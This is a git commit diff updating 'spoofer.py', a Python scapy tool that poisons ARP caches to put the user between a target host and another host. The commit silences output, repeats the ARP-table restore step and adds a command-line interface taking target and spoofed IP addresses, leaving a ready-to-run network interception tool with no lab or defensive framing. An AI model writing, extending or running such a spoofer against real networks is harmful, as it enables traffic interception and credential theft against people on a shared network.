e293c12d9fb93dbd35d21c9fb8b67bfed0ac51ae
Nitrox <thomas@esculpavit.com>
2025-03-28 09:58:10 +0100

    Update spoofer.py

--- spoofer.py
+++ spoofer.py
@@ -1,9 +1,10 @@
 import scapy.all as scapy
+import argparse
 
 def arp_ask(target_ip):
     arp_request = scapy.ARP(pdst=target_ip)
     packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / arp_request
-    answered, unanswered = scapy.srp(packet, timeout=2, verbose=True)
+    answered, unanswered = scapy.srp(packet, timeout=2, verbose=False)
     return answered[0][1].hwsrc # return the MAC address of the target // answered[0][1] is the ARP response
 
 def arp_spoof(target_ip, spoof_ip):
@@ -15,9 +16,7 @@ def arp_restore(target_ip, spoof_ip):
     target_mac = arp_ask(target_ip)
     spoof_mac = arp_ask(spoof_ip)
     arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac, op=2) # we are telling the target the real mac address of the spoof ip
-    ether = scapy.Ether(dst=target_mac)
-    packet = ether / arp_response
-    scapy.send(packet, verbose=True)
+    scapy.send(arp_response, verbose=False)
     
 def spoof(target_ip, spoof_ip):
     try:
@@ -26,9 +25,18 @@ def spoof(target_ip, spoof_ip):
             arp_spoof(spoof_ip, target_ip)
     except KeyboardInterrupt:
         print("Restoring ARP tables...")
-        arp_restore(target_ip, spoof_ip)
-        arp_restore(spoof_ip, target_ip)
+        for i in range(2):
+            arp_restore(target_ip, spoof_ip)
+            arp_restore(spoof_ip, target_ip)
         print("ARP tables restored.")
         return
-    
-spoof('','')
+
+if __name__ == "__main__":
+    args_parse = argparse.ArgumentParser(description="Spoof ip address")
+    args_parse.add_argument('-t', '--target', type=str, help='IP of the target')
+    args_parse.add_argument('-s', '--spoof', type=str, help='spoofed IP address')
+
+    args = args_parse.parse_args()
+
+
+    spoof(args.target,args.spoof)
